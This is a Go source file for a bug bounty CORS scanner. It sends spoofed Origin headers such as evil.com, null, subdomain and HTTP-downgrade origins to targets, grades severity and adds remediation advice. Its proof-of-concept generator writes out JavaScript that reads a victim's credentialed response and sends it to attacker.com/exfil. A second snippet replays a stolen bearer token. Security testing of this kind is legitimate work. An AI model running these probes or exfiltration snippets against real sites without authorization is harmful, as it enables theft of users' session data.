// Package cors implements a native Go CORS testing engine for bug bounty.
//
// Tests 5 attack vectors per target, assigns severity based on actual
// exploitability (not just header presence), and integrates with the
// BBounty Pro findings pipeline.
//
// Vectors tested:
//  1. Origin reflection + credentials:true → Critical
//  2. Null origin + credentials:true → High
//  3. Subdomain spoof + credentials:true → High
//  4. HTTP origin on HTTPS + credentials:true → High
//  5. Origin reflection without credentials → High
//  6. Wildcard + credentials (browser rejects, Medium)
//  7. Pre-flight bypass attempts
package cors

import (
	"context"
	"fmt"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/rs/zerolog/log"
)

// ── Severity ──────────────────────────────────────────────────────────────────

type Severity string

const (
	SeverityCritical Severity = "critical"
	SeverityHigh     Severity = "high"
	SeverityMedium   Severity = "medium"
	SeverityLow      Severity = "low"
	SeverityInfo     Severity = "info"
)

// ── Finding ───────────────────────────────────────────────────────────────────

type Finding struct {
	URL             string    `json:"url"`
	Vector          string    `json:"vector"`
	Severity        Severity  `json:"severity"`
	Origin          string    `json:"origin_sent"`
	ReflectedOrigin string    `json:"origin_reflected"`
	WithCredentials bool      `json:"with_credentials"`
	Description     string    `json:"description"`
	PoC             string    `json:"poc"`
	Remediation     string    `json:"remediation"`
	Timestamp       time.Time `json:"timestamp"`
}

// ── Engine ────────────────────────────────────────────────────────────────────

type Engine struct {
	client     *http.Client
	maxWorkers int
}

func New() *Engine {
	return &Engine{
		client: &http.Client{
			Timeout: 10 * time.Second,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse // don't follow redirects
			},
		},
		maxWorkers: 10,
	}
}

// TestURL runs all CORS vectors against a single URL.
func (e *Engine) TestURL(ctx context.Context, targetURL string) []Finding {
	var findings []Finding
	var mu sync.Mutex

	// Extract base domain for subdomain spoof vector
	baseDomain := extractDomain(targetURL)
	isHTTPS := strings.HasPrefix(targetURL, "https://")

	// Define all test vectors
	type vector struct {
		name   string
		origin string
		desc   string
	}

	vectors := []vector{
		{
			name:   "origin_reflection",
			origin: "https://evil.com",
			desc:   "Arbitrary origin reflection",
		},
		{
			name:   "null_origin",
			origin: "null",
			desc:   "Null origin (sandboxed iframe attack)",
		},
		{
			name:   "subdomain_spoof",
			origin: fmt.Sprintf("https://evil.%s", baseDomain),
			desc:   "Subdomain spoof (weak suffix matching)",
		},
	}

	// HTTP downgrade only makes sense for HTTPS targets
	if isHTTPS {
		vectors = append(vectors, vector{
			name:   "http_downgrade",
			origin: fmt.Sprintf("http://%s", baseDomain),
			desc:   "HTTP origin on HTTPS target (protocol downgrade)",
		})
	}

	// Wildcard check
	vectors = append(vectors, vector{
		name:   "wildcard",
		origin: "*",
		desc:   "Wildcard ACAO check",
	})

	// Run vectors concurrently
	sem := make(chan struct{}, e.maxWorkers)
	var wg sync.WaitGroup

	for _, v := range vectors {
		v := v
		wg.Add(1)
		go func() {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			select {
			case <-ctx.Done():
				return
			default:
			}

			// Test with credentials
			f := e.testVector(ctx, targetURL, v.origin, v.name, v.desc, true)
			if f != nil {
				mu.Lock()
				findings = append(findings, *f)
				mu.Unlock()
				return // found with credentials — no need to test without
			}

			// Test without credentials
			f = e.testVector(ctx, targetURL, v.origin, v.name, v.desc, false)
			if f != nil {
				mu.Lock()
				findings = append(findings, *f)
				mu.Unlock()
			}
		}()
	}

	wg.Wait()

	// Also test pre-flight bypass
	if f := e.testPreflightBypass(ctx, targetURL); f != nil {
		findings = append(findings, *f)
	}

	return findings
}

// TestTargets runs CORS tests against multiple URLs concurrently.
func (e *Engine) TestTargets(ctx context.Context, urls []string) []Finding {
	var all []Finding
	var mu sync.Mutex

	sem := make(chan struct{}, e.maxWorkers)
	var wg sync.WaitGroup

	for _, u := range urls {
		u := u
		wg.Add(1)
		go func() {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			results := e.TestURL(ctx, u)
			if len(results) > 0 {
				mu.Lock()
				all = append(all, results...)
				mu.Unlock()
				log.Info().
					Str("url", u).
					Int("findings", len(results)).
					Msg("[cors] vulnerabilities found")
			}
		}()
	}

	wg.Wait()
	return all
}

// ── Internal test functions ───────────────────────────────────────────────────

func (e *Engine) testVector(
	ctx context.Context,
	targetURL, origin, vectorName, vectorDesc string,
	withCredentials bool,
) *Finding {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, targetURL, nil)
	if err != nil {
		return nil
	}

	req.Header.Set("Origin", origin)
	req.Header.Set("User-Agent",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36")

	if withCredentials {
		// Simulate credentialed request
		req.Header.Set("Cookie", "session=test")
	}

	resp, err := e.client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	acao := resp.Header.Get("Access-Control-Allow-Origin")
	acac := strings.EqualFold(
		resp.Header.Get("Access-Control-Allow-Credentials"), "true",
	)
	vary := resp.Header.Get("Vary")

	// Check if origin is reflected
	reflected := acao == origin ||
		(origin == "null" && acao == "null") ||
		(acao == "*")

	if !reflected {
		return nil
	}

	// Wildcard + credentials: browsers reject this — not actually exploitable
	if acao == "*" && acac {
		return &Finding{
			URL: targetURL, Vector: vectorName,
			Severity: SeverityMedium, Origin: origin,
			ReflectedOrigin: acao, WithCredentials: false,
			Description: "Wildcard ACAO with credentials header present (browser-rejected combination)",
			PoC:         generatePoC(targetURL, origin, false),
			Remediation: "Remove Access-Control-Allow-Credentials or use explicit origins instead of wildcard",
			Timestamp:   time.Now(),
		}
	}

	// Calculate severity
	sev := classifySeverity(vectorName, acac, reflect.isActive(vary))

	desc := buildDescription(vectorName, vectorDesc, acac, acao)
	poc  := generatePoC(targetURL, origin, acac)

	return &Finding{
		URL: targetURL, Vector: vectorName,
		Severity: sev, Origin: origin,
		ReflectedOrigin: acao, WithCredentials: acac,
		Description: desc,
		PoC:         poc,
		Remediation: corsRemediation(sev),
		Timestamp:   time.Now(),
	}
}

func (e *Engine) testPreflightBypass(ctx context.Context, targetURL string) *Finding {
	// Test if OPTIONS pre-flight is misconfigured
	req, err := http.NewRequestWithContext(ctx, http.MethodOptions, targetURL, nil)
	if err != nil {
		return nil
	}

	req.Header.Set("Origin", "https://evil.com")
	req.Header.Set("Access-Control-Request-Method", "PUT")
	req.Header.Set("Access-Control-Request-Headers", "Authorization,X-Custom-Header")

	resp, err := e.client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	acam := resp.Header.Get("Access-Control-Allow-Methods")
	acah := resp.Header.Get("Access-Control-Allow-Headers")
	acao := resp.Header.Get("Access-Control-Allow-Origin")

	// Check for dangerous pre-flight: allows arbitrary methods + auth headers
	if acao == "https://evil.com" &&
		strings.Contains(strings.ToUpper(acam), "PUT") &&
		strings.Contains(strings.ToLower(acah), "authorization") {
		return &Finding{
			URL:             targetURL,
			Vector:          "preflight_bypass",
			Severity:        SeverityHigh,
			Origin:          "https://evil.com",
			ReflectedOrigin: acao,
			WithCredentials: true,
			Description: "Pre-flight response allows arbitrary origin with PUT + Authorization header. " +
				"Attacker can make credentialed cross-origin PUT requests.",
			PoC:         generatePreflightPoC(targetURL),
			Remediation: corsRemediation(SeverityHigh),
			Timestamp:   time.Now(),
		}
	}

	return nil
}

// ── Severity classification ───────────────────────────────────────────────────

func classifySeverity(vector string, credentials bool, varyPresent bool) Severity {
	// Severity matrix based on HawkEye + OWASP CORS guidance
	switch vector {
	case "origin_reflection":
		if credentials {
			return SeverityCritical // Any attacker site can steal auth data
		}
		return SeverityHigh // Public data readable cross-origin

	case "null_origin":
		if credentials {
			return SeverityHigh // Exploitable via sandboxed iframe
		}
		return SeverityMedium

	case "subdomain_spoof":
		if credentials {
			return SeverityHigh // Attacker registers matching domain
		}
		return SeverityMedium

	case "http_downgrade":
		if credentials {
			return SeverityHigh // Requires MITM but exploitable
		}
		return SeverityMedium

	case "preflight_bypass":
		return SeverityHigh

	default:
		return SeverityMedium
	}
}

// ── Helper types and functions ────────────────────────────────────────────────

type reflectHelper struct{}

var reflect = reflectHelper{}

func (reflectHelper) isActive(vary string) bool {
	return strings.Contains(strings.ToLower(vary), "origin")
}

func extractDomain(rawURL string) string {
	u := strings.TrimPrefix(rawURL, "https://")
	u = strings.TrimPrefix(u, "http://")
	if idx := strings.Index(u, "/"); idx != -1 {
		u = u[:idx]
	}
	if idx := strings.Index(u, ":"); idx != -1 {
		u = u[:idx]
	}
	return u
}

func buildDescription(vector, desc string, credentials bool, acao string) string {
	cred := "without credentials"
	if credentials {
		cred = "with credentials (cookies/auth headers)"
	}
	return fmt.Sprintf(
		"CORS misconfiguration: %s. Server reflects origin '%s' %s. "+
			"Attacker can make cross-origin requests from controlled domain.",
		desc, acao, cred,
	)
}

func generatePoC(targetURL, origin string, credentials bool) string {
	credStr := ""
	if credentials {
		credStr = "\n  credentials: 'include',"
	}
	return fmt.Sprintf(`<!-- CORS PoC — run from attacker's site (%s) -->
<script>
  fetch('%s', {
    method: 'GET',%s
    headers: { 'Content-Type': 'application/json' }
  })
  .then(r => r.text())
  .then(data => {
    // Exfiltrate response to attacker server
    fetch('https://attacker.com/exfil?data=' + btoa(data));
  });
</script>`, origin, targetURL, credStr)
}

func generatePreflightPoC(targetURL string) string {
	return fmt.Sprintf(`<!-- Pre-flight bypass PoC -->
<script>
  fetch('%s', {
    method: 'PUT',
    credentials: 'include',
    headers: {
      'Authorization': 'Bearer <stolen_token>',
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({action: 'exploit'})
  }).then(r => r.text()).then(console.log);
</script>`, targetURL)
}

func corsRemediation(sev Severity) string {
	base := "Fix: Implement strict CORS policy:\n" +
		"  1. Whitelist specific origins (never reflect arbitrary Origin header)\n" +
		"  2. Never combine Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true\n" +
		"  3. Add 'Vary: Origin' header when using dynamic origin validation\n" +
		"  4. Validate origin against a strict allowlist server-side"

	if sev == SeverityCritical {
		return "⚠️ CRITICAL — Immediate fix required. " + base
	}
	return base
}

// ── HTTP Handler (integrates with BBounty Pro pipeline) ──────────────────────

// ScanRequest is the request body for the CORS scan endpoint.
type ScanRequest struct {
	URLs    []string `json:"urls"`
	Timeout int      `json:"timeout_seconds"` // default 30
}

// ScanResponse wraps findings for the API response.
type ScanResponse struct {
	Scanned  int       `json:"scanned"`
	Findings []Finding `json:"findings"`
	Duration string    `json:"duration"`
}
